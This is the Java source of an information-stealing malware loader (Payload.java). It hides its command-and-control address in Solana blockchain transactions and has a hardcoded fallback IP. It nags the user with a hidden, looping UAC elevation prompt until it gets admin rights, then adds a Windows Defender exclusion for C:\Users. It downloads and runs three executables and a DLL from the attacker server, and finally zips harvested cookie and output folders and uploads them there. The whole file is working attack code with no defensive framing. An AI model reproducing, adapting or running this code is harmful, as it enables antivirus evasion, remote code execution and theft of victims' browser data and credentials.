// language: Java, file: payload/Payload.java
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Base64;
import java.util.zip.*;

public class Payload {
    private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
    private static final String SOLANA_RPC = "https://api.devnet.solana.com";
    private static final String FALLBACK_SERVER = "95.182.96.216";

    public static void main(String[] args) {
        log("--- STARTING ST.JAR ---");
        try {
            String key = "";
            String ip = "";

            if (args.length >= 2) {
                key = args[0].trim();
                ip = args[1].trim();
            } else {
                log("No arguments passed. Fetching IP from Solana...");
                ip = getC2Ip();
                // If key is missing, try to read it from key.json
                key = readKeyJson();
            }

            log("Key: " + key + " | IP: " + ip);

            if (!isAdmin()) {
                log("Not admin. Starting UAC loop...");
                uacLoop(key, ip);
            } else {
                log("We are Admin! Proceeding.");
                executePayload(key, ip);
            }
        } catch (Throwable t) {
            log("FATAL: " + t.toString());
        }
    }

    private static String readKeyJson() {
        try {
            String appData = System.getenv("APPDATA");
            File keyFile = new File(appData + "\\loader\\key.json");
            if (keyFile.exists()) {
                String content = new String(Files.readAllBytes(keyFile.toPath()));
                int start = content.indexOf("\"key\":\"") + 7;
                int end = content.indexOf("\"", start);
                if (start > 6 && end > start) {
                    return content.substring(start, end);
                }
            }
        } catch (Exception e) {}
        return "";
    }

    private static String getC2Ip() {
        try {
            // 1. Get latest signatures
            String sigPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"" + SOLANA_WALLET + "\",{\"limit\":10}]}";
            String sigRes = httpPost(SOLANA_RPC, sigPayload);
            if (sigRes == null) return FALLBACK_SERVER;

            // 2. Parse signatures
            java.util.List<String> sigs = new java.util.ArrayList<>();
            String searchKey = "\"signature\":\"";
            int idx = 0;
            while ((idx = sigRes.indexOf(searchKey, idx)) != -1) {
                idx += searchKey.length();
                int end = sigRes.indexOf("\"", idx);
                if (end != -1) {
                    sigs.add(sigRes.substring(idx, end));
                    idx = end;
                }
            }

            if (sigs.isEmpty()) {
                log("No transactions found on Solana.");
                return FALLBACK_SERVER;
            }

            // 3. Check each tx for the IP
            for (String sig : sigs) {
                log("Checking tx: " + sig);
                String txPayload = "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getTransaction\",\"params\":[\"" + sig + "\",{\"encoding\":\"json\"}]}";
                String txRes = httpPost(SOLANA_RPC, txPayload);
                
                if (txRes != null) {
                    int ipStart = txRes.indexOf("1(");
                    if (ipStart != -1) {
                        int ipEnd = txRes.indexOf(")", ipStart);
                        if (ipEnd != -1) {
                            String candidate = txRes.substring(ipStart + 2, ipEnd);
                            if (candidate.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}")) {
                                log("Found IP in Solana: " + candidate);
                                return candidate;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            log("Solana error: " + e.toString());
        }
        
        log("Using fallback IP.");
        return FALLBACK_SERVER;
    }

    private static String httpPost(String urlStr, String jsonBody) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonBody.getBytes("UTF-8"));
            }
            
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"))) {
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                }
                return sb.toString();
            }
        } catch (Exception e) {
            return null;
        }
    }

    private static void log(String msg) {
        try {
            String appData = System.getenv("APPDATA");
            File logFile = new File(appData + "\\loader\\java_debug.txt");
            FileWriter fw = new FileWriter(logFile, true);
            fw.write(msg + "\n");
            fw.close();
        } catch (Exception e) {}
    }

    private static boolean isAdmin() {
        try {
            File f = new File("C:\\Windows\\System32\\config");
            return f.list() != null;
        } catch (Exception e) { return false; }
    }

    private static void uacLoop(String key, String ip) {
        try {
            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
            String javaExe = javaHome + "\\bin\\javaw.exe";
            String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
            
            log("java: " + javaExe);
            log("jar: " + jarPath);

            String psCommand = String.format(
                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s' -Wait",
                javaExe, jarPath, key, ip
            );

            while (true) {
                log("Triggering UAC via PowerShell...");
                Process p = new ProcessBuilder(
                    "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand
                ).start();
                
                p.waitFor(); 
                
                if (isAdmin()) {
                     log("We are Admin now? That's weird. Exiting loop.");
                     break;
                }
                
                log("Retrying UAC loop...");
                Thread.sleep(1000);
            }
        } catch (Exception e) {
            log("UAC Error: " + e.toString());
        }
    }

    private static void executePayload(String key, String ip) {
        try {
            log("Executing payload...");
            String appData = System.getenv("APPDATA");
            File loaderDir = new File(appData, "loader");

            log("Adding AV exclusion...");
            String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
            String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
            Runtime.getRuntime().exec(cmd).waitFor();
            
            log("Downloading payloads...");
            String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
            for (String file : files) {
                downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
            }

            log("Executing 3.exe...");
            new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath()).start();
            
            log("Executing 2.exe...");
            new ProcessBuilder(new File(loaderDir, "2.exe").getAbsolutePath(), "all").start();
            
            Thread.sleep(2000);
            
            log("Executing 1.exe...");
            new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath()).start();

            log("Waiting for harvest...");
            Thread.sleep(25000);
            File zipFile = new File(loaderDir, "capture.zip");
            zipFolders(new String[]{"output", "cookies"}, zipFile);
            
            log("Uploading capture.zip...");
            uploadFile("http://" + ip + "/api/rpc", zipFile, key);
            log("Done!");

        } catch (Exception e) {
            log("Execute Error: " + e.toString());
        }
    }

    private static void downloadFile(String urlStr, File dest) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            try (InputStream in = conn.getInputStream(); OutputStream out = new FileOutputStream(dest)) {
                byte[] buf = new byte[8192]; int len;
                while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
            }
            log("Downloaded " + dest.getName() + " successfully.");
        } catch (Exception e) { 
            log("Download failed " + urlStr + ": " + e.toString()); 
        }
    }

    private static void zipFolders(String[] folders, File zipFile) {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            for (String folder : folders) {
                File dir = new File(folder);
                if (!dir.exists()) continue;
                for (File f : dir.listFiles()) {
                    if (f.isFile()) {
                        zos.putNextEntry(new ZipEntry(folder + "/" + f.getName()));
                        Files.copy(f.toPath(), zos);
                        zos.closeEntry();
                    }
                }
            }
        } catch (Exception e) { log("Zip failed: " + e.toString()); }
    }

    private static void uploadFile(String urlStr, File file, String key) {
        try {
            byte[] bytes = Files.readAllBytes(file.toPath());
            String b64 = Base64.getEncoder().encodeToString(bytes);
            String json = "{\"cmd\":\"upload\",\"key\":\"" + key + "\",\"clientId\":1,\"name\":\"capture.zip\",\"data\":\"" + b64 + "\"}";
            
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            try (OutputStream os = conn.getOutputStream()) { os.write(json.getBytes()); }
            conn.getResponseCode();
            log("Upload successful.");
        } catch (Exception e) { log("Upload failed: " + e.toString()); }
    }
}